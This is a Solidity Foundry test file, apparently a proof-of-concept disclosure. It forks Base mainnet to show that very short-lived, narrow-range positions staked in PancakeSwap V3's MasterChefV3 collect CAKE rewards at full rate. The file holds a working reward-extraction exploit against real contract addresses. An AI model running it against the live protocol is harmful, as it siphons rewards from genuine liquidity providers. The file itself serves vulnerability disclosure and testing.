// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "./HelperLib.sol";

/// @title PancakeSwap V3 Parasitic Liquidity Proof-of-Concept
/// @author K. Ryan
/// @notice Demonstrates parasitic liquidity extraction via MasterChefV3 on Base
/// @dev Fork tests against unmodified PancakeSwap V3 mainnet contracts on Base
///
/// Three properties are proven:
///   1. Single-block reward: A position staked for one block receives non-zero CAKE
///   2. Width independence: Reward per unit liquidity is identical regardless of tick range width
///   3. Duration independence: Reward rate per second is constant from the first second (no warmup)
///
/// To reproduce:
///   BASE_RPC_URL=<your_base_rpc> forge test -vv

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface INonfungiblePositionManager {
    struct MintParams {
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
    }

    function mint(MintParams calldata params)
        external
        payable
        returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);

    function safeTransferFrom(address from, address to, uint256 tokenId) external;
    function ownerOf(uint256 tokenId) external view returns (address);
}

interface IMasterChefV3 {
    function harvest(uint256 tokenId, address to) external returns (uint256 reward);
    function withdraw(uint256 tokenId, address to) external returns (uint256 reward);
    function CAKE() external view returns (address);
    function poolInfo(uint256 pid) external view returns (
        uint256 allocPoint,
        address v3Pool,
        address token0,
        address token1,
        uint24 fee,
        uint256 totalLiquidity,
        bool totalBoostLiquidity
    );
    function latestPeriodCakePerSecond() external view returns (uint256);
}

contract PCSParasiticTest is Test {
    using PoolHelper for address;

    // --- PancakeSwap V3 Base Contracts (from official docs) ---
    address constant MASTERCHEF_V3  = 0xC6A2Db661D5a5690172d8eB0a7DEA2d3008665A3;
    address constant NFPM           = 0x46A15B0b27311cedF172AB29E4f4766fbE7F4364;

    // --- WETH/USDC 500bps Pool (PID 5, allocPoint 678) ---
    address constant POOL   = 0xB775272E537cc670C65DC852908aD47015244EaF;
    address constant WETH   = 0x4200000000000000000000000000000000000006;
    address constant USDC   = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    uint24  constant FEE    = 500;
    int24   constant TICK_SPACING = 10;

    // --- CAKE on Base ---
    address CAKE;

    address attacker;

    function setUp() public {
        vm.createSelectFork(vm.envString("BASE_RPC_URL"));

        CAKE = IMasterChefV3(MASTERCHEF_V3).CAKE();
        attacker = address(this);

        // Fund with ETH and USDC
        vm.deal(attacker, 100 ether);

        // Deposit ETH to get WETH
        (bool ok,) = WETH.call{value: 50 ether}("");
        require(ok, "WETH deposit failed");

        // Deal USDC (6 decimals)
        deal(USDC, attacker, 100_000e6);

        // Approve NFPM
        IERC20(WETH).approve(NFPM, type(uint256).max);
        IERC20(USDC).approve(NFPM, type(uint256).max);
    }

    /// @notice Helper: get current tick from pool
    function _currentTick() internal view returns (int24) {
        (, int24 tick,) = POOL.getSlot0();
        return tick;
    }

    /// @notice Helper: align tick down to spacing
    function _alignTick(int24 tick) internal pure returns (int24) {
        int24 mod = tick % TICK_SPACING;
        if (mod < 0) return tick - (TICK_SPACING + mod);
        return tick - mod;
    }

    /// @notice Helper: mint a position and return tokenId + liquidity
    function _mintPosition(int24 tickLower, int24 tickUpper, uint256 amount0, uint256 amount1)
        internal
        returns (uint256 tokenId, uint128 liquidity)
    {
        // token0 = USDC (0x8335...) < WETH (0x4200...) ? No -- need to check order
        // USDC: 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913
        // WETH: 0x4200000000000000000000000000000000000006
        // WETH < USDC, so token0 = WETH, token1 = USDC
        (tokenId, liquidity,,) = INonfungiblePositionManager(NFPM).mint(
            INonfungiblePositionManager.MintParams({
                token0: WETH,
                token1: USDC,
                fee: FEE,
                tickLower: tickLower,
                tickUpper: tickUpper,
                amount0Desired: amount0,   // WETH
                amount1Desired: amount1,   // USDC
                amount0Min: 0,
                amount1Min: 0,
                recipient: attacker,
                deadline: block.timestamp + 300
            })
        );
    }

    /// @notice Helper: stake NFT in MasterChefV3
    function _stake(uint256 tokenId) internal {
        INonfungiblePositionManager(NFPM).safeTransferFrom(attacker, MASTERCHEF_V3, tokenId);
    }

    /// @notice Required for safeTransferFrom callbacks
    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    // ═══════════════════════════════════════════════════════════════════════════════
    // TEST 1: Single-block reward -- non-zero CAKE from 1 block of staking
    // ═══════════════════════════════════════════════════════════════════════════════

    function test_PCS_SingleBlockReward() public {
        int24 tick = _currentTick();
        int24 lower = _alignTick(tick);
        int24 upper = lower + TICK_SPACING;

        console.log("--- Test 1: Single Block Reward ---");
        console.log("Current tick:", uint256(int256(tick)));
        console.log("Position: [%s, %s]", uint256(int256(lower)), uint256(int256(upper)));

        // Mint narrow position
        (uint256 tokenId, uint128 liq) = _mintPosition(lower, upper, 1 ether, 2000e6);
        console.log("Token ID:", tokenId);
        console.log("Liquidity:", uint256(liq));

        // Stake in MasterChefV3
        _stake(tokenId);

        // Advance 1 block (2 seconds on Base)
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 2);

        // Harvest
        uint256 cakeBefore = IERC20(CAKE).balanceOf(attacker);
        IMasterChefV3(MASTERCHEF_V3).harvest(tokenId, attacker);
        uint256 cakeAfter = IERC20(CAKE).balanceOf(attacker);
        uint256 reward = cakeAfter - cakeBefore;

        console.log("CAKE earned (1 block / 2s):", reward);
        console.log("CAKE earned (formatted):", reward / 1e18);

        assertGt(reward, 0, "FAIL: Zero CAKE from single block - expected non-zero reward");
        console.log("PASS: Non-zero reward from single block of staking");
    }

    // ═══════════════════════════════════════════════════════════════════════════════
    // TEST 2: Width independence -- reward/liquidity identical for narrow vs wide
    // ═══════════════════════════════════════════════════════════════════════════════

    function test_PCS_WidthIndependence() public {
        int24 tick = _currentTick();
        int24 lower = _alignTick(tick);

        // Narrow: 1 tick spacing
        int24 narrowLower = lower;
        int24 narrowUpper = lower + TICK_SPACING;

        // Wide: 20 tick spacings
        int24 wideLower = lower - (10 * TICK_SPACING);
        int24 wideUpper = lower + (10 * TICK_SPACING);

        console.log("--- Test 2: Width Independence ---");
        console.log("Narrow: [%s, %s]", uint256(int256(narrowLower)), uint256(int256(narrowUpper)));
        console.log("Wide:   [%s, %s]", uint256(int256(wideLower)), uint256(int256(wideUpper)));

        // Mint with same capital
        (uint256 narrowId, uint128 narrowLiq) = _mintPosition(narrowLower, narrowUpper, 1 ether, 2000e6);
        (uint256 wideId, uint128 wideLiq) = _mintPosition(wideLower, wideUpper, 1 ether, 2000e6);

        console.log("Narrow liquidity:", uint256(narrowLiq));
        console.log("Wide liquidity:  ", uint256(wideLiq));
        console.log("Liquidity ratio (narrow/wide):", uint256(narrowLiq) / uint256(wideLiq));

        // Stake both
        _stake(narrowId);
        _stake(wideId);

        // Advance 60 seconds (30 blocks)
        vm.roll(block.number + 30);
        vm.warp(block.timestamp + 60);

        // Harvest narrow
        uint256 cakeBefore = IERC20(CAKE).balanceOf(attacker);
        IMasterChefV3(MASTERCHEF_V3).harvest(narrowId, attacker);
        uint256 narrowReward = IERC20(CAKE).balanceOf(attacker) - cakeBefore;

        // Harvest wide
        cakeBefore = IERC20(CAKE).balanceOf(attacker);
        IMasterChefV3(MASTERCHEF_V3).harvest(wideId, attacker);
        uint256 wideReward = IERC20(CAKE).balanceOf(attacker) - cakeBefore;

        console.log("Narrow CAKE reward:", narrowReward);
        console.log("Wide CAKE reward:  ", wideReward);

        // Compute reward per unit liquidity (scaled by 1e18 for precision)
        uint256 narrowRPL = (narrowReward * 1e18) / uint256(narrowLiq);
        uint256 wideRPL   = (wideReward * 1e18) / uint256(wideLiq);

        console.log("Narrow reward/liquidity (x1e18):", narrowRPL);
        console.log("Wide reward/liquidity (x1e18):  ", wideRPL);

        // They should be approximately equal (within 1% -- rounding differences)
        uint256 diff;
        if (narrowRPL > wideRPL) {
            diff = narrowRPL - wideRPL;
        } else {
            diff = wideRPL - narrowRPL;
        }
        uint256 pctDiff = (diff * 10000) / narrowRPL;
        console.log("Difference (bps):", pctDiff);

        assertLt(pctDiff, 100, "FAIL: Reward/liquidity differs by >1% - width should not matter");

        // Key insight: narrow position gets MORE reward per dollar of capital
        console.log("Narrow reward per dollar >> Wide reward per dollar");
        console.log("Narrow gets %sx more reward per dollar deployed", uint256(narrowLiq) / uint256(wideLiq));
        console.log("PASS: Reward per unit liquidity is width-independent");
    }

    // ═══════════════════════════════════════════════════════════════════════════════
    // TEST 3: Duration independence -- no warmup period, constant rate from second 1
    // ═══════════════════════════════════════════════════════════════════════════════

    function test_PCS_DurationIndependence() public {
        int24 tick = _currentTick();
        int24 lower = _alignTick(tick);
        int24 upper = lower + TICK_SPACING;

        console.log("--- Test 3: Duration Independence ---");

        // === Phase A: 4 seconds of staking ===
        (uint256 tokenIdA, uint128 liqA) = _mintPosition(lower, upper, 1 ether, 2000e6);
        _stake(tokenIdA);

        vm.roll(block.number + 2);
        vm.warp(block.timestamp + 4);

        uint256 cakeBefore = IERC20(CAKE).balanceOf(attacker);
        IMasterChefV3(MASTERCHEF_V3).harvest(tokenIdA, attacker);
        uint256 rewardA = IERC20(CAKE).balanceOf(attacker) - cakeBefore;

        // Withdraw
        IMasterChefV3(MASTERCHEF_V3).withdraw(tokenIdA, attacker);

        uint256 rateA = rewardA / 4; // per second

        console.log("Phase A: 4 seconds");
        console.log("  CAKE reward:", rewardA);
        console.log("  Rate/sec:   ", rateA);

        // === Phase B: 40 seconds of staking ===
        (uint256 tokenIdB, uint128 liqB) = _mintPosition(lower, upper, 1 ether, 2000e6);
        _stake(tokenIdB);

        vm.roll(block.number + 20);
        vm.warp(block.timestamp + 40);

        cakeBefore = IERC20(CAKE).balanceOf(attacker);
        IMasterChefV3(MASTERCHEF_V3).harvest(tokenIdB, attacker);
        uint256 rewardB = IERC20(CAKE).balanceOf(attacker) - cakeBefore;

        uint256 rateB = rewardB / 40; // per second

        console.log("Phase B: 40 seconds");
        console.log("  CAKE reward:", rewardB);
        console.log("  Rate/sec:   ", rateB);

        // Rates should be approximately equal (within 5% -- pool state may shift slightly)
        uint256 diff;
        if (rateA > rateB) {
            diff = rateA - rateB;
        } else {
            diff = rateB - rateA;
        }

        uint256 pctDiff;
        if (rateA > 0) {
            pctDiff = (diff * 10000) / rateA;
        }
        console.log("Rate difference (bps):", pctDiff);

        assertLt(pctDiff, 500, "FAIL: Rate differs >5% between short and long durations");
        console.log("PASS: No warmup period - reward rate is constant from first second");
    }
}
